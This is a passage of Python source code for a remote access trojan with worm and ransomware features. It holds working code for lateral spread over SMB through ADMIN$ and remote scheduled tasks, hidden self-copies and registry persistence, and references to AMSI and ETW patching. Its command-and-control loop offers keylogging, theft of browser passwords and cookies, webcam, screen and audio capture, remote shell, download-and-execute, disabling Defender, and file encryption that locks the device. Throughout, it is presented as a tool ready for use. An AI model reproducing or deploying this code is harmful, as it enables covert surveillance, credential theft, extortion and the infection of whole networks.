        task_name = _sb("b5GBSs77EF9WMPDg")
        subprocess.run(
            ["schtasks", "/create", "/s", server, "/tn", task_name,
             "/tr", exe_path, "/sc", "onlogon", "/rl", "highest", "/f"],
            capture_output=True, timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["schtasks", "/create", "/s", server, "/tn", task_name + "Health",
             "/tr", exe_path, "/sc", "minute", "/mo", "15", "/rl", "highest", "/f"],
            capture_output=True, timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def _lan_worm_scan():
    """Scan local subnet for SMB (445) and attempt psexec-style spread."""
    exe = _get_exe_path()
    while _SPREADER_ACTIVE.is_set():
        try:
            # Determine local subnet
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            parts = local_ip.split(".")
            if len(parts) != 4:
                _SPREADER_ACTIVE.wait(timeout=300)
                continue
            subnet = ".".join(parts[:3])
            _log(f"LAN worm: scanning {subnet}.0/24 on port 445...")
            open_hosts = []
            # Quick scan of subnet (try common hosts first)
            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                if ip == local_ip:
                    continue
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    result = s.connect_ex((ip, 445))
                    s.close()
                    if result == 0:
                        open_hosts.append(ip)
                except:
                    pass
            _log(f"LAN worm: found {len(open_hosts)} hosts with SMB open")
            for ip in open_hosts:
                # Try to copy via ADMIN$
                unc = f"\\\\{ip}\\ADMIN$\\WinSvcUpdate.exe"
                try:
                    ps = (
                        "$s='" + exe.replace("'","''") + "';"
                        "$d='" + unc.replace("'","''") + "';"
                        "Copy-Item -LiteralPath $s -Destination $d -Force -ErrorAction 0;"
                        "if(Test-Path $d){"
                        "schtasks /create /s " + ip + " /tn WinSvcUpdate /tr $d /sc onlogon /rl highest /f"
                        "}"
                    )
                    b64 = base64.b64encode(ps.encode("utf-16le")).decode()
                    subprocess.run(
                        ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
                        capture_output=True, timeout=60,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    _log(f"LAN worm: spread to {ip}")
                except:
                    pass
        except:
            pass
        _SPREADER_ACTIVE.wait(timeout=600)

def _spreader_init():
    """Start all replication threads."""
    if not _SPREADER_ACTIVE.is_set():
        return
    threading.Thread(target=_usb_spreader_loop, daemon=True).start()
    threading.Thread(target=_network_share_spreader, daemon=True).start()
    threading.Thread(target=_lan_worm_scan, daemon=True).start()
    _log("Spreader engine active (USB + shares + LAN)")

# ─── 5 Hidden Copies + Mutual Watchdog ──────────────────────

def _hidden_copies_deploy():
    """Copy executable to 5 hidden locations."""
    exe = _get_exe_path()
    locations = [
        os.environ.get("APPDATA", ""),
        os.environ.get("LOCALAPPDATA", ""),
        os.environ.get("TEMP", ""),
        os.environ.get("USERPROFILE", ""),
        os.path.join(os.environ.get("APPDATA", ""), _sb("a4GcWtn7LUo=")),
    ]
    deployed = []
    for base in locations:
        if not base:
            continue
        dest = os.path.join(base, "WinSvcUpdate.exe")
        try:
            if os.path.abspath(exe).lower() != os.path.abspath(dest).lower():
                shutil.copy2(exe, dest)
                os.system(f'attrib +h "{dest}"')
            deployed.append(dest)
        except:
            pass
    return deployed

def _hidden_copies_register():
    """Register each copy in registry so they auto-start."""
    copies = _hidden_copies_deploy()
    try:
        import winreg
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run")
        for i, path in enumerate(copies):
            winreg.SetValueEx(k, f"WinSvcCopy{i}", 0, winreg.REG_SZ, f'"{path}"')
        winreg.CloseKey(k)
        _log(f"  [+] Deployed {len(copies)} hidden copies")
    except:
        pass

def _mutual_watchdog():
    """Each copy watches the others. Restore any that go missing."""
    while True:
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
            i = 0
            while True:
                try:
                    name, val, _ = winreg.EnumValue(k, i)
                    i += 1
                    if not name.startswith(_sb("b5GBSs77BkBCKA==")):
                        continue
                    path = val.strip('"')
                    if not os.path.exists(path):
                        _log(f"  [!] Copy missing: {path}, redeploying...")
                        exe = _get_exe_path()
                        try:
                            shutil.copy2(exe, path)
                            os.system(f'attrib +h "{path}"')
                        except:
                            pass
                except OSError:
                    break
            winreg.CloseKey(k)
        except:
            pass
        _watchdog_active.wait(timeout=60)

# ─── Init all immortality features ────────────────────────────

def _immortality_init():
    _log("Initializing immortality suite...")
    _patch_amsi()
    _patch_etw()
    if not _create_mutex():
        _log("Mutex exists — already running or collision")
    _registry_persistence()
    _install_service()
    _scheduled_tasks_persistence()
    _dead_mans_switch()
    _ads_hide()
    _start_watchdog()
    _wmi_persistence()
    _hidden_copies_register()
    _spreader_init()
    threading.Thread(target=_handle_revocation_loop, daemon=True).start()
    threading.Thread(target=_dead_mans_switch_updater, daemon=True).start()
    threading.Thread(target=_mutual_watchdog, daemon=True).start()
    _log("Immortality suite initialized")

# ─── Redefine install_persistence to use enhanced version ──────

def enhanced_install_persistence():
    _immortality_init()

# ─── Main Loop ────────────────────────────────────────────────


async def main():
    global _keylog_on, _keybuf

    _log(f"Starting. Target: ws://{SERVER_IP}:{SERVER_PORT}/ws/client")
    retry_count = 0
    uri = f"ws://{SERVER_IP}:{SERVER_PORT}/ws/client"
    uri_cam = f"ws://{SERVER_IP}:{SERVER_PORT}/ws/client_cam"

    def _kl():
        global _keylog_on, _keybuf
        def on_press(k):
            global _keybuf
            if _keylog_on:
                try:
                    _keybuf += str(k.char)
                except:
                    _keybuf += f"[{k}]"
        try:
            with KeyboardListener(on_press=on_press) as l:
                l.join()
        except:
            pass

    threading.Thread(target=_kl, daemon=True).start()

    # --- UDP stream setup ---
    _udp_transport_send = None
    _udp_seq = 0
    _stream_via_udp = _UDP_AVAILABLE and SERVER_IP not in ("127.0.0.1", "localhost")
    _udp_port_local = 0
    _last_stream_ts = time.time()

    if _stream_via_udp:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            sock.setblocking(False)
            _udp_transport_send, _ = await asyncio.get_event_loop().create_datagram_endpoint(
                lambda: asyncio.DatagramProtocol(), sock=sock
            )
            _udp_port_local = sock.getsockname()[1]
            _log(f"UDP stream ready on port {_udp_port_local}")
        except Exception as ex:
            _log(f"UDP stream unavailable: {ex}")
            _stream_via_udp = False

    _STREAM_UDP_PORT = 1000

    async def _send_udp_frame(frame_type: int, payload: bytes):
        nonlocal _udp_seq
        if not _stream_via_udp or not _udp_transport_send:
            return False
        try:
            _udp_seq += 1
            header = DEVICE_ID.encode("ascii") + struct.pack("<I", _udp_seq) + bytes([frame_type])
            max_frag = 60000
            frags = [payload[i:i+max_frag] for i in range(0, len(payload), max_frag)]
            for idx, frag in enumerate(frags):
                pkt = header + bytes([len(frags), idx]) + frag
                _udp_transport_send.sendto(pkt, (SERVER_IP, _STREAM_UDP_PORT))
            return True
        except Exception:
            return False

    ws_kw = dict(
        ping_interval=10,
        ping_timeout=45,
        close_timeout=15,
        max_size=2**25,

    )

    # TCP keepalive via raw socket
    try:
        import ctypes
        sock_fileno = None
    except:
        pass

    while True:
        try:
            _log(f"Connecting to {uri}")
            async with websockets.connect(uri, **ws_kw) as ws:
                # Enable TCP keepalive
                try:
                    tr = ws.transport
                    if hasattr(tr, "get_extra_info"):
                        tr_sock = tr.get_extra_info("socket")
                        if tr_sock:
                            tr_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                            tr_sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 5000, 3000))
                except:
                    pass

                lock_ws = asyncio.Lock()
                lock_stream = asyncio.Lock()

                async def send_ws(data):
                    async with lock_ws:
                        await ws.send(data)

                async def send_stream(data):
                    """Try UDP first, fall back to WebSocket."""
                    if len(data) > 1:
                        frame_type = data[0]
                        payload = data[1:]
                        if frame_type in (0x01, 0x02) and await _send_udp_frame(frame_type, payload):
                            return
                    async with lock_stream:
                        await ws.send(data)

                with mss.mss() as s:
                    m = s.monitors[0]
                    res = {"w": m["width"], "h": m["height"]}

                reg_data = {
                    "id": DEVICE_ID,
                    "hostname": HOSTNAME,
                    "os": platform.platform(),
                    "is_admin": True,
                    "agent_name": _AGENT_NAME,
                    "res": res,
                }
                if _stream_via_udp:
                    reg_data["udp_port"] = _udp_port_local
                await send_ws(
                    json.dumps({"cmd": CMD_REG, "data": reg_data})
                )
                _log("Control channel registered (waiting for server session)...")
                await asyncio.sleep(0.15)

                # Camera WS managed independently so failures don't crash control connection
                _cam_ws = None
                _cam_lock = asyncio.Lock()

                async def _ensure_cam_ws():
                    nonlocal _cam_ws
                    if _cam_ws is not None and not _cam_ws.open:
                        try:
                            await _cam_ws.close()
                        except Exception:
                            pass
                        _cam_ws = None
                    if _cam_ws is None:
                        try:
                            cam = await websockets.connect(uri_cam, **ws_kw)
                            await cam.send(json.dumps({"cmd": CMD_REG, "data": {"id": DEVICE_ID}}))
                            _cam_ws = cam
                            _log("Camera WS reconnected")
                        except Exception as ex:
                            _log(f"Camera WS connect failed: {ex}")
                    return _cam_ws

                async def send_cam(data):
                    nonlocal _cam_ws
                    if len(data) > 1:
                        frame_type = data[0]
                        payload = data[1:]
                        if frame_type in (0x01, 0x02) and await _send_udp_frame(frame_type, payload):
                            return
                    cam = await _ensure_cam_ws()
                    if cam is None:
                        return
                    try:
                        async with _cam_lock:
                            await cam.send(data)
                    except ConnectionClosed:
                        _cam_ws = None
                    except Exception:
                        _cam_ws = None

                # Initial camera WS connection
                await _ensure_cam_ws()
                _log("Registered (control + camera channels).")
                retry_count = 0

                async def agent_keepalive():
                    """Lightweight JSON ping so proxies/NAT see application traffic; complements WebSocket protocol pings."""
                    while True:
                        try:
                            await asyncio.sleep(22)
                            await send_ws(json.dumps({"cmd": CMD_PING, "args": {}}))
                        except (ConnectionClosed, asyncio.CancelledError):
                            break
                        except Exception:
                            break

                async def recv_loop():
                    global _keylog_on, _keybuf, _view_mode, _cam_stream_enabled
                    while True:
                        raw = await ws.recv()
                        if isinstance(raw, bytes):
                            if len(raw) > 1 and raw[0] == 0x03:
                                audio_data = raw[1:]
                                try:
                                    if len(audio_data) >= 12 and audio_data[:4] == b"RIFF":
                                        tmp = os.path.join(os.environ.get("TEMP", "."), f"admin_audio_{uuid.uuid4().hex}.wav")
                                        with open(tmp, "wb") as f:
                                            f.write(audio_data)
                                        try:
                                            import winsound
                                            winsound.PlaySound(tmp, winsound.SND_FILENAME | winsound.SND_ASYNC)
                                        except Exception:
                                            _log(f"Admin audio chunk saved to {tmp}")
                                    else:
                                        _feed_remote_mic_pcm(audio_data)
                                except Exception as ex:
                                    _log(f"Admin audio playback failed: {ex}")
                            continue

                        msg = json.loads(raw)
                        cmd = msg.get("cmd")
                        a = msg.get("args", {})
                        try:
                            if cmd == CMD_MOUSE:
                                do_move(a.get("x", 0), a.get("y", 0))
                            elif cmd == CMD_CLICK:
                                do_click(a.get("btn", "left"), a.get("down", True))
                            elif cmd == CMD_KEY:
                                do_key(a.get("key", ""))
                            elif cmd == CMD_SHELL:
                                shell_id = a.get("shellId", "side")
                                cmdline = a.get("cmd", "echo ok")
                                cdir = a.get("cwd")
                                if cdir:
                                    cdir = os.path.normpath(cdir)
                                    if not os.path.isdir(cdir):
                                        await send_ws(
                                            json.dumps(
                                                {
                                                    "cmd": CMD_SHELL,
                                                    "data": {
                                                        "out": f"(error) Not a directory: {cdir}\n",
                                                        "shellId": shell_id,
                                                    },
                                                }
                                            )
                                        )
                                        continue

                                timeout_s = 90 if shell_id == "pop" else 120
                                # Send immediate status so dashboard shows "running..."
                                await send_ws(
                                    json.dumps({"cmd": CMD_SHELL, "data": {"out": None, "shellId": shell_id, "status": "running"}})
                                )

                                def _run_shell():
                                    return _run_shell_sync(cmdline, cdir, timeout_s, shell_id)

                                out = await asyncio.to_thread(_run_shell)
                                await send_ws(
                                    json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": shell_id}})
                                )
                            elif cmd == CMD_CAM:
                                import cv2
                                async with _camera_lock:
                                    cap = _open_camera()
                                    if cap is not None:
                                        ret, frame = cap.read()
                                    else:
                                        ret = False
                                if not ret:
                                    _log("CMD_CAM: unable to grab camera frame")
                                else:
                                    _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                                    await send_ws(b"\x01" + buf.tobytes())
                            elif cmd == CMD_VIEW:
                                if a.get("substream") == "cam":
                                    _cam_stream_enabled = bool(a.get("enabled", False))
                                    audio_requested = bool(a.get("audio", False))
                                    _log(f"Cam substream -> {_cam_stream_enabled}, audio -> {audio_requested}")
                                    _ensure_audio(audio_requested)
                                else:
                                    _view_mode = a.get("mode", "screen")
                                    audio_requested = bool(a.get("audio", False))
                                    _log(f"View mode → {_view_mode}, audio → {audio_requested}")
                                    _ensure_audio(audio_requested)
                            elif cmd == CMD_FILE_LS:
                                p = a.get("path", ".")
                                if p == "DRIVES":
                                    items = []
                                    import string
                                    for c in string.ascii_uppercase:
                                        if os.path.exists(f"{c}:\\"):
                                            items.append({"name": f"{c}:\\", "is_dir": True, "size": 0})
                                    await send_ws(json.dumps({"cmd": CMD_FILE_LS, "data": {"path": "DRIVES", "items": items}}))
                                else:

                                    def _scan_dir(path):
                                        out_items = []
                                        try:
                                            for e in os.scandir(path):
                                                try:
                                                    out_items.append(
                                                        {
                                                            "name": e.name,
                                                            "is_dir": e.is_dir(),
                                                            "size": e.stat().st_size if not e.is_dir() else 0,
                                                        }
                                                    )
                                                except Exception:
                                                    pass
                                        except Exception as ex:
                                            return os.path.abspath(path), [], str(ex)
                                        return os.path.abspath(path), out_items, None

                                    abspath, items, err = await asyncio.to_thread(_scan_dir, p)
                                    if err:
                                        await send_ws(
                                            json.dumps(
                                                {
                                                    "cmd": CMD_FILE_LS,
                                                    "data": {"path": abspath, "items": [], "error": err},
                                                }
                                            )
                                        )
                                    else:
                                        await send_ws(
                                            json.dumps({"cmd": CMD_FILE_LS, "data": {"path": abspath, "items": items}})
                                        )
                            elif cmd == CMD_SOUND:
                                global _sound_rx_buf, _sound_rx_total
                                name = a.get("name", "sound.wav")
                                if a.get("reset"):
                                    _sound_rx_buf = bytearray()
                                    _sound_rx_total = int(a.get("size", 0) or 0)
                                chunk = a.get("b64")
                                if chunk:
                                    if _sound_rx_buf is None:
                                        _sound_rx_buf = bytearray()
                                    try:
                                        _sound_rx_buf.extend(base64.b64decode(chunk))
                                    except Exception:
                                        pass
                                assembling = _sound_rx_buf is not None
                                if assembling:
                                    if len(_sound_rx_buf) > 20_000_000:
                                        _sound_rx_buf = None
                                        _sound_rx_total = 0
                                        _log("Inject: size cap exceeded, aborted.")
                                    elif a.get("end") or (_sound_rx_total and len(_sound_rx_buf) >= _sound_rx_total):
                                        rawb = bytes(_sound_rx_buf)
                                        _sound_rx_buf = None
                                        _sound_rx_total = 0
                                        if len(rawb) > 8:
                                            _play_sound_inject_async(rawb, name)
                                elif a.get("bytes"):
                                    try:
                                        rawb = base64.b64decode(a["bytes"])
                                        if len(rawb) > 8:
                                            _play_sound_inject_async(rawb, name)
                                    except Exception as ex:
                                        _log(f"Audio injection failed: {ex}")
                            elif cmd == CMD_FILE_RUN:
                                os.startfile(a.get("path", "."))
                            elif cmd == CMD_FILE_DL:
                                fp = a.get("path", "")

                                def _read_b64(path):
                                    with open(path, "rb") as f:
                                        return base64.b64encode(f.read()).decode()

                                try:
                                    b64 = await asyncio.to_thread(_read_b64, fp)
                                    await send_ws(
                                        json.dumps(
                                            {"cmd": CMD_FILE_DL, "data": {"name": os.path.basename(fp), "bytes": b64}}
                                        )
                                    )
                                except Exception as ex:
                                    await send_ws(
                                        json.dumps(
                                            {
                                                "cmd": CMD_SHELL,
                                                "data": {"out": f"(error) Download read failed: {ex}\n", "shellId": "side"},
                                            }
                                        )
                                    )
                            elif cmd == CMD_KEYLOG:
                                act = a.get("action", "")
                                if act == "start":
                                    _keylog_on = True
                                elif act == "stop":
                                    _keylog_on = False
                                elif act == "fetch":
                                    await send_ws(json.dumps({"cmd": CMD_KEYLOG, "data": _keybuf}))
                                    _keybuf = ""
                            elif cmd == CMD_VAULT:
                                data = await asyncio.to_thread(harvest_passwords)
                                await send_ws(json.dumps({"cmd": CMD_VAULT, "data": data}))
                            elif cmd == CMD_COOKIES:
                                data = await asyncio.to_thread(harvest_cookies)
                                await send_ws(json.dumps({"cmd": CMD_COOKIES, "data": data}))
                            elif cmd == CMD_LOCK:
                                threading.Thread(target=do_lock, args=(a.get("password", "admin"),), daemon=True).start()
                            elif cmd == 0x21:
                                c = await asyncio.to_thread(do_encrypt, a.get("targets", ""))
                                msgs = { -3: "No public key embedded. Rebuild agent with keys." }
                                msg = msgs.get(c, f"Encrypted {c} files.")
                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                            elif cmd == 0x22:
                                c = await asyncio.to_thread(do_decrypt, a.get("targets", ""))
                                msgs = { -1: "No private key stored. Use Key Inject first.", -2: "Invalid private key format." }
                                msg = msgs.get(c, f"Decrypted {c} files.")
                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                            elif cmd == CMD_KEY_INJECT:
                                pk = a.get("privkey", "")
                                if pk:
                                    global _stored_privkey
                                    _stored_privkey = pk
                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Private key injected successfully.", "shellId": "side"}}))
                                else:
                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Key injection failed: no key provided.", "shellId": "side"}}))
                            elif cmd == CMD_RANSOM:
                                c = await asyncio.to_thread(do_ransomware)
                                msg = f"Ransomware deployed. {c} files encrypted. Device locked."
                                key_name = _AGENT_NAME
                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                            elif cmd == CMD_RANSOM_UNLOCK:
                                c = await asyncio.to_thread(do_unlock_ransom)
                                msgs = { -1: "No private key stored. Use Key Inject first." }
                                msg = msgs.get(c, f"Unlocked. Decrypted {c} files.")
                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                            elif cmd == CMD_URL:
                                webbrowser.open(a.get("url", ""))
                            elif cmd == CMD_DL_EXE:
                                url = a.get("url", "")
                                filename = a.get("name", "")
                                args = a.get("args", "")
                                run_in_terminal = a.get("terminal", False)

                                def _dl_run_sync():
                                    import urllib.request, uuid
                                    if not filename:
                                        filename = url.split("/")[-1] or f"run_{uuid.uuid4().hex[:8]}.exe"
                                    dest = os.path.join(os.environ.get("TEMP", "."), f".{uuid.uuid4().hex[:12]}_{filename}")
                                    try:
                                        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
                                        with urllib.request.urlopen(req, timeout=60) as r:
                                            with open(dest, "wb") as f:
                                                f.write(r.read())
                                    except Exception as e:
                                        return f"(error) Download failed: {e}\n"
                                    if not os.path.exists(dest):
                                        return "(error) File not found after download\n"
                                    try:
                                        _K32.SetFileAttributesW(dest, 0x02)
                                    except:
                                        pass
                                    if run_in_terminal:
                                        full_cmd = f'Start-Process -FilePath "{dest}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit code 0"}}else{{echo "[FAIL] Exit code $LASTEXITCODE"}}'
                                        b64 = base64.b64encode(full_cmd.encode("utf-16le")).decode()
                                        p = subprocess.Popen(
                                            ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
                                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                            text=True, encoding="utf-8", errors="replace",
                                            creationflags=0x08000000,
                                        )
                                        out, _ = p.communicate(timeout=120)
                                        try:
                                            os.remove(dest)
                                        except:
                                            pass
                                        return out or "(no output)\n"
                                    else:
                                        subprocess.Popen(
                                            f'"{dest}" {args}'.strip(),
                                            shell=True, creationflags=0x08000000
                                        )
                                        return f"[OK] Launched: {filename} ({dest})\n"

                                try:
                                    out = await asyncio.to_thread(_dl_run_sync)
                                    d = {"cmd": CMD_DL_EXE, "data": {"out": out}}
                                    await send_ws(json.dumps(d))
                                except subprocess.TimeoutExpired:
                                    await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": "(error) Command timed out (120s)\n"}}))
                                except Exception as ex:
                                    _log(f"CMD_DL_EXE: {ex}")
                                    await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": f"(error) {ex}\n"}}))
                            elif cmd == CMD_RUN_EXE:
                                path = a.get("path", "")
                                args = a.get("args", "")
                                show_in_terminal = a.get("terminal", False)
                                if show_in_terminal:
                                    ps_cmd = f'Start-Process -FilePath "{path}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit 0"}}else{{echo "[FAIL] Exit $LASTEXITCODE"}}'
                                    b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
                                    def _run_term():
                                        p = subprocess.Popen(
                                            ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
                                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                            text=True, encoding="utf-8", errors="replace",
                                            creationflags=0x08000000,
                                        )
                                        return p.communicate(timeout=120)[0] or ""
                                    out = await asyncio.to_thread(_run_term)
                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": "side"}}))
                                else:
                                    subprocess.Popen(f'"{path}" {args}'.strip(), shell=True, creationflags=0x08000000)
                            elif cmd == CMD_DISABLE_DEFENDER:
                                def _defender_sync():
                                    return _disable_defender()
                                out = await asyncio.to_thread(_defender_sync)
                                await send_ws(
                                    json.dumps({"cmd": CMD_SHELL, "data": {"out": out + "\n", "shellId": "side"}})
                                )
                            elif cmd == CMD_PING:
                                pass
                        except ConnectionClosed:
                            raise
                        except Exception as ex:
                            _log(f"CMD {hex(cmd) if cmd else '?'} err: {ex}")

                async def camera_loop():
                    """Single capture + encode path: stable LED, lower lag, no dual OpenCV grab."""
                    target_dt = 1.0 / 28.0
                    idle_ticks = 0
                    while True:
                        t0 = time.perf_counter()
                        try:
                            if not _camera_needed():
                                idle_ticks += 1
                                if idle_ticks >= 6:
                                    async with _camera_lock:
                                        _close_camera()
                                    idle_ticks = 0
                                await asyncio.sleep(0.08)
                                continue
                            idle_ticks = 0
                            async with _camera_lock:
                                cap = _open_camera()
                                if cap is None:
                                    await asyncio.sleep(0.06)
                                    continue
                                ret, frame = cap.read()
                            if not ret:
                                await asyncio.sleep(0.02)
                                continue
                            import cv2
                            _, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                            blob = b"\x01" + jpg.tobytes()
                            if _view_mode == "cam":
                                await send_stream(blob)
                            if _cam_stream_enabled:
                                await send_cam(blob)
                        except ConnectionClosed:
                            raise
                        except Exception as ex:
                            _log(f"camera_loop: {ex}")
                        elapsed = time.perf_counter() - t0
                        await asyncio.sleep(max(0.0, target_dt - elapsed))

                async def stream_loop():
                    """MJPEG + frame diff: skip encode/send when screen unchanged."""
                    quality = 48
                    _quiet_quality = 48
                    min_quality = 15
                    max_quality = 85
                    frame_interval = 0.048
                    min_interval = 0.020
                    max_interval = 0.250
                    send_times = []
                    quality_adj_ticks = 0
                    _prev_frame_hash = None
                    import hashlib

                    def _grab_screen_jpeg(q):
                        with mss.mss() as sx:
                            img = sx.grab(sx.monitors[0])
                            buf = BytesIO()
                            Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
                                buf, format="JPEG", quality=q, optimize=True
                            )
                            return img.bgra, b"\x01" + buf.getvalue()

                    def _adjust_quality(elapsed):
                        nonlocal quality, _quiet_quality, frame_interval, quality_adj_ticks
                        send_times.append(elapsed)
                        if len(send_times) > 10:
                            send_times.pop(0)
                        quality_adj_ticks += 1
                        if quality_adj_ticks >= 15:
                            quality_adj_ticks = 0
                            avg = sum(send_times) / len(send_times)
                            if avg > 0.25 and quality > min_quality:
                                quality = max(min_quality, quality - 8)
                            elif avg < 0.06 and quality < max_quality:
                                quality = min(max_quality, quality + 4)
                            frame_interval = max(min_interval, min(max_interval, avg * 1.5))
                            _quiet_quality = quality

                    while True:
                        try:
                            if _view_mode == "screen":
                                _hid_now = time.time() - _last_hid_time < 0.5
                                if _hid_now:
                                    quality = 15
                                    frame_interval = max(frame_interval, 0.12)
                                else:
                                    quality = _quiet_quality

                                t0 = time.perf_counter()
                                raw_bgra, blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
                                cur_hash = hashlib.md5(raw_bgra).digest()
                                if _prev_frame_hash is not None and cur_hash == _prev_frame_hash:
                                    elapsed = time.perf_counter() - t0
                                    _adjust_quality(elapsed)
                                else:
                                    await send_stream(blob)
                                    elapsed = time.perf_counter() - t0
                                    _adjust_quality(elapsed)
                                _prev_frame_hash = cur_hash

                            if _audio_enabled:
                                pkt = _audio_try_pop()
                                if pkt:
                                    await send_stream(pkt)
                                    if _cam_stream_enabled:
                                        await send_cam(pkt)
                        except ConnectionClosed:
                            raise
                        except (BrokenPipeError, ConnectionResetError, OSError) as ex:
                            _log(f"Stream loop socket error: {ex}")
                            raise
                        except Exception as ex:
                            _log(f"Stream loop error: {ex}")
                        if _audio_enabled:
                            await asyncio.sleep(0.014)
                        else:
                            await asyncio.sleep(max(0.014, frame_interval if _view_mode == "screen" else 0.02))

                recv_t = asyncio.create_task(recv_loop())
                stream_t = asyncio.create_task(stream_loop())
                cam_t = asyncio.create_task(camera_loop())
                ping_t = asyncio.create_task(agent_keepalive())
                tasks = {recv_t, stream_t, cam_t, ping_t}
                try:
                    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                    exc_to_raise = None
                    for t in done:
                        if not t.cancelled():
                            ex = t.exception()
                            if ex is not None:
                                exc_to_raise = ex
                    for p in pending:
                        p.cancel()
                    if pending:
                        await asyncio.gather(*pending, return_exceptions=True)
                    if exc_to_raise is not None:
                        raise exc_to_raise
                finally:
                    for t in tasks:
                        if not t.done():
                            t.cancel()
                    await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            raise
        except ExceptionGroup as eg:
            for sub in eg.exceptions:
                _log(f"Connection error: {sub}")
        except Exception as ex:
            _log(f"Connection error: {ex}")

        delay = min(2 * (2 ** min(retry_count, 4)), 30)
        _log(f"Retrying in {delay} seconds...")
        await asyncio.sleep(delay)
        retry_count += 1
if __name__ == "__main__":
    check_lock_state()
    enhanced_install_persistence()
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)
    _loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
    try:
        _loop.run_until_complete(main())
    finally:
        try:
            _loop.run_until_complete(_loop.shutdown_asyncgens())
        except Exception:
            pass
        _loop.close()
